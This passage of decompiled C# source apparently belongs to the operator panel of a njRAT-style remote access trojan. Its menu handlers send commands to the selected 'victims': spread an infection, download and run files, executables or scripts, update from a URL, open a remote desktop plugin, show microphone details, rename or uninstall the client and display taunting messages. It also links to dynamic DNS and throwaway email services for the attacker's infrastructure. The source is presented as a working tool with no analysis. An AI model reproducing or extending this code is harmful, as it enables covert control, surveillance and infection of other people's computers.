								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void IndexFileToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "OpenPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "LINK", "http://starmaroc-b.com/wp-content/uploads/vid1010.swf", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void GgggggggToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "OpenPage" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ServicesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "infection" + sokserver.Y;
				IEnumerator enumerator = null;
				text = text;
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						try
						{
							object[] array = new object[]
							{
								text
							};
							bool[] array2 = new bool[]
							{
								true
							};
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
							flag = array2[0];
							if (flag)
							{
								text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
							}
							listViewItem.ForeColor = Color.LightSteelBlue;
						}
						catch (Exception expr_DA)
						{
							ProjectData.SetProjectError(expr_DA);
							Exception projectError = expr_DA;
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void MensagemChatToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void OpenChatToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private void LogsHackdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "TextToSpeech" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Text To Speech", "Text To Spech", "Hello from me you HACKER", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem13_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				Frm_URL frm_URL = new Frm_URL();
				frm_URL.ShowDialog(this);
				flag = frm_URL.IsOK;
				if (flag)
				{
					IEnumerator enumerator = null;
					string text = string.Concat(new string[]
					{
						"rn",
						sokserver.Y,
						frm_URL.TextBox2.Text,
						sokserver.Y,
						frm_URL.TextBox1.Text
					});
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_136)
							{
								ProjectData.SetProjectError(expr_136);
								Exception projectError = expr_136;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem14_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.FileName = "";
				flag = (openFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					bool flag2 = true;
					string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
					byte[] array = FN.SB(ref text);
					MemoryStream memoryStream = new MemoryStream();
					string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
					memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
					thread.Start(new object[]
					{
						this.L1V.SelectedItems,
						memoryStream.ToArray(),
						Color.LightSteelBlue
					});
				}
			}
		}

		private void ToolStripMenuItem15_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				Script script = new Script();
				script.ShowDialog(this);
				flag = (script.Code.Length > 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					string[] array = new string[5];
					array[0] = "rn";
					array[1] = sokserver.Y;
					array[2] = script.RunAs;
					array[3] = sokserver.Y;
					bool flag2 = true;
					array[4] = Convert.ToBase64String(FN.ZIP(FN.SB(ref script.Code), ref flag2));
					string text = string.Concat(array);
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array2 = new object[]
								{
									text
								};
								bool[] array3 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array2, null, null, array3, true);
								flag = array3[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_14A)
							{
								ProjectData.SetProjectError(expr_14A);
								Exception projectError = expr_14A;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem23_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "EXE|*.exe";
				openFileDialog.FileName = "";
				flag = (openFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					bool flag2 = true;
					string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
					byte[] array = FN.SB(ref text);
					MemoryStream memoryStream = new MemoryStream();
					string text2 = "up" + sokserver.Y;
					memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
					thread.Start(new object[]
					{
						this.L1V.SelectedItems,
						memoryStream.ToArray(),
						Color.LightSteelBlue
					});
				}
			}
		}

		private void ToolStripMenuItem24_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "up" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void ToolStripMenuItem25_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					try
					{
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
						{
							"un" + sokserver.Y + "~"
						}, null, null, null, true);
					}
					catch (Exception expr_62)
					{
						ProjectData.SetProjectError(expr_62);
						Exception projectError = expr_62;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem26_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					try
					{
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
						{
							"un" + sokserver.Y + "@"
						}, null, null, null, true);
					}
					catch (Exception expr_67)
					{
						ProjectData.SetProjectError(expr_67);
						Exception projectError = expr_67;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem27_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					try
					{
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
						{
							"un" + sokserver.Y + "!"
						}, null, null, null, true);
					}
					catch (Exception expr_67)
					{
						ProjectData.SetProjectError(expr_67);
						Exception projectError = expr_67;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem28_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1V.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					try
					{
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "CN", new object[]
						{
							false
						}, null, null, false, true);
					}
					catch (Exception expr_59)
					{
						ProjectData.SetProjectError(expr_59);
						Exception projectError = expr_59;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void ToolStripMenuItem29_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter New Name", "Rename Victim", "", -1, -1);
			bool flag = text.Length > 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						try
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", new object[]
							{
								string.Concat(new string[]
								{
									"prof",
									sokserver.Y,
									"~",
									sokserver.Y,
									"vn",
									sokserver.Y,
									FN.ENB(ref text)
								})
							}, null, null, null, true);
							listViewItem.Text = text + "_" + Strings.Split(listViewItem.Text, "_", -1, CompareMethod.Binary)[checked(Strings.Split(listViewItem.Text, "_", -1, CompareMethod.Binary).Length - 1)];
						}
						catch (Exception expr_111)
						{
							ProjectData.SetProjectError(expr_111);
							Exception projectError = expr_111;
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private void MicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int num2;
			int num3;
			try
			{
				IL_01:
				int num = 1;
				bool flag = this.L1V.SelectedItems.Count != 0;
				if (!flag)
				{
					goto IL_75C;
				}
				IL_23:
				ProjectData.ClearProjectError();
				num2 = -2;
				IL_2C:
				num = 3;
				Application.DoEvents();
				IL_35:
				num = 4;
				Thread.Sleep(10);
				IL_40:
				num = 5;
				Frm_VInfo frm_VInfo = new Frm_VInfo();
				IL_49:
				num = 6;
				frm_VInfo.Text = string.Concat(new string[]
				{
					"Mcrophonp: ",
					this.L1V.SelectedItems[0].Text,
					Environment.MachineName,
					"\\@",
					Environment.UserName
				});
				IL_9E:
				num = 7;
				frm_VInfo.ListView1.Items[0].SubItems[1].Text = this.L1V.SelectedItems[0].Text;
				IL_D9:
				num = 8;
				frm_VInfo.ListView1.Items[0].SubItems[2].Text = "OK";
				IL_103:
				num = 9;
				frm_VInfo.ListView1.Items[1].SubItems[1].Text = this.CEL.snf[1];
				IL_136:
				num = 10;
				frm_VInfo.ListView1.Items[1].SubItems[2].Text = "OK";
				IL_161:
				num = 11;
				frm_VInfo.ListView1.Items[2].SubItems[1].Text = "%" + this.CEL.snf[2] + "%";
				IL_1A3:
				num = 12;
				frm_VInfo.ListView1.Items[2].SubItems[2].Text = "OK";
				IL_1CE:
				num = 13;
				frm_VInfo.ListView1.Items[3].SubItems[1].Text = this.CEL.snf[3];
				IL_201:
				num = 14;
				frm_VInfo.ListView1.Items[3].SubItems[2].Text = "OK";
				IL_22C:
				num = 15;
				frm_VInfo.ListView1.Items[4].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[1].Text;
				IL_273:
				num = 16;
				frm_VInfo.ListView1.Items[4].SubItems[2].Text = "OK";
				IL_29E:
				num = 17;
				string text = string.Concat(new string[]
				{
					this.CEL.snf[1]
				});
				IL_2C1:
				num = 18;
				string[] array = text.Split(new char[]
				{
					':'
				});
				IL_2DC:
				num = 19;
				frm_VInfo.ListView1.Items[5].SubItems[1].Text = string.Concat(new string[]
				{
					array[1]
				});
				IL_316:
				num = 20;
				frm_VInfo.ListView1.Items[5].SubItems[2].Text = "OK";
				IL_341:
				num = 21;
				frm_VInfo.ListView1.Items[6].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[2].Text;
				IL_388:
				num = 22;
				frm_VInfo.ListView1.Items[6].SubItems[2].Text = "OK";
				IL_3B3:
				num = 23;
				frm_VInfo.ListView1.Items[7].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[3].Text;
				IL_3FA:
				num = 24;
				frm_VInfo.ListView1.Items[7].SubItems[2].Text = "OK";
				IL_425:
				num = 25;
				frm_VInfo.ListView1.Items[8].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[4].Text;
				IL_46C:
				num = 26;
				frm_VInfo.ListView1.Items[8].SubItems[2].Text = "OK";
				IL_497:
				num = 27;
				frm_VInfo.ListView1.Items[9].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[5].Text;
				IL_4DF:
				num = 28;
				frm_VInfo.ListView1.Items[9].SubItems[2].Text = "OK";
				IL_50B:
				num = 29;
				frm_VInfo.ListView1.Items[10].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[6].Text;
				IL_553:
				num = 30;
				frm_VInfo.ListView1.Items[10].SubItems[2].Text = "OK";
				IL_57F:
				num = 31;
				frm_VInfo.ListView1.Items[11].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[7].Text;
				IL_5C7:
				num = 32;
				frm_VInfo.ListView1.Items[11].SubItems[2].Text = "OK";
				IL_5F3:
				num = 33;
				frm_VInfo.ListView1.Items[12].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[8].Text;
				IL_63B:
				num = 34;
				frm_VInfo.ListView1.Items[12].SubItems[2].Text = "OK";
				IL_667:
				num = 35;
				frm_VInfo.ListView1.Items[13].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[9].Text;
				IL_6B0:
				num = 36;
				frm_VInfo.ListView1.Items[13].SubItems[2].Text = "OK";
				IL_6DC:
				num = 37;
				frm_VInfo.ListView1.Items[14].SubItems[1].Text = this.L1V.SelectedItems[0].SubItems[10].Text;
				IL_725:
				num = 38;
				frm_VInfo.ListView1.Items[14].SubItems[2].Text = "OK";
				IL_751:
				num = 39;
				frm_VInfo.Show();
				IL_75C:
				IL_75D:
				goto IL_867;
				IL_766:
				int arg_76D_0 = num3 + 1;
				num3 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_76D_0);
				IL_81A:
				goto IL_85C;
				num3 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
				IL_838:
				goto IL_85C;
			}
			object arg_83A_0;
			endfilter(arg_83A_0 is Exception & num2 != 0 & num3 == 0);
			IL_85C:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_867:
			if (num3 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			bool flag = !this.Panel3.Visible;
			if (flag)
			{
				this.Panel3.Visible = true;
			}
			else
			{
				this.Panel3.Visible = false;
			}
		}

		private void ToolStripStatusLabel4_Click_1(object sender, EventArgs e)
		{
			MyProject.Forms.About_Coder.Show();
		}

		private void ToolStripStatusLabel5_Click(object sender, EventArgs e)
		{
			MyProject.Forms.STNG.Show();
		}

		private void ToolStripStatusLabel3_Click_1(object sender, EventArgs e)
		{
			MyProject.Forms.Frm_Builder.Show();
		}

		private void Timer4_Tick(object sender, EventArgs e)
		{
			ToolStripStatusLabel tou = this.Tou;
			tou.Text = Conversions.ToString(Conversions.ToDouble(tou.Text) + 1.0);
			bool flag = Conversions.ToDouble(this.Tou.Text) == 111500.0;
			if (flag)
			{
				this.Timer2.Enabled = false;
			}
		}

		private void Timer5_Tick(object sender, EventArgs e)
		{
			ToolStripStatusLabel tool = this.Tool1;
			tool.Text = Conversions.ToString(Conversions.ToDouble(tool.Text) + 1.0);
			bool flag = Conversions.ToDouble(this.Tool1.Text) == 111570.0;
			if (flag)
			{
				this.Timer5.Enabled = false;
			}
		}

		private void conz_Click(object sender, EventArgs e)
		{
			MyProject.Forms.spoofer.Show();
		}

		private void upl_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Form6.Show();
		}

		private void UploadImageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FileName = "";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = true;
				string text = Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag2));
				byte[] array = FN.SB(ref text);
				MemoryStream memoryStream = new MemoryStream();
				string text2 = "rn" + sokserver.Y + new FileInfo(openFileDialog.FileName).Extension + sokserver.Y;
				memoryStream.Write(FN.SB(ref text2), 0, text2.Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(sokserver.SendTo), 1);
				thread.Start(new object[]
				{
					this.L1V.SelectedItems,
					memoryStream.ToArray(),
					Color.Green
				});
			}
		}

		private void NoIPSiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("http://www.noip.com/");
		}

		private void NoIPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("http://www.noip.com/download?page=win/");
		}

		private void SiteEmailToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("http://www.yopmail.com/en/");
		}

		private void PortSiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.vpnauthority.com/index.php?route=account/login");
		}

		private void RRRToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.L1V.GridLines = true;
		}

		private void RRRRToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.L1V.GridLines = false;
		}

		private void GridLinesToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void ColorLIToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1V.ForeColor = colorDialog.Color;
		}

		private void ColorLinesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1V.BackColor = colorDialog.Color;
		}

		private void ExlamationMessageToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				string text = "MsgboxExl" + sokserver.Y;
				string text2 = Interaction.InputBox("Enter Msgbox", "Send Msgbox", "", -1, -1);
				flag = (Operators.CompareString(text2, "", false) != 0);
				if (flag)
				{
					IEnumerator enumerator = null;
					text += text2;
					try
					{
						enumerator = this.L1V.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							try
							{
								object[] array = new object[]
								{
									text
								};
								bool[] array2 = new bool[]
								{
									true
								};
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(listViewItem.Tag), null, "Send", array, null, null, array2, true);
								flag = array2[0];
								if (flag)
								{
									text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
								}
								listViewItem.ForeColor = Color.LightSteelBlue;
							}
							catch (Exception expr_115)
							{
								ProjectData.SetProjectError(expr_115);
								Exception projectError = expr_115;
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		private void SettingListToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void GridLinesToolStripToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.StatusStrip1.BackColor = colorDialog.Color;
		}

		private void ToolStripMenuItem21_Click(object sender, EventArgs e)
		{
		}

		private void NoipToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		private void InjectToDesctopShortcutToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void RemoteDesktopToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
		}

		private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1V.SelectedItems.Count != 0;
			if (flag)
			{
				IEnumerator enumerator = null;
				plg pLG = sokserver.GETPLG("Nj_sc2.dll", null);
				try
				{
					enumerator = this.L1V.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						listViewItem.ForeColor = Color.LightSteelBlue;
						sokserver.SendPlug((Client)listViewItem.Tag, pLG, false);
					}
				}
				finally
				{
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		private plg p()
		{
			plg result;
			return result;
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Mic : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("vmethod_4")]
		private Timer _vmethod_4;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		public Client osk;

		public string QQ;

		public Client sk;

		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Timer vmethod_4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
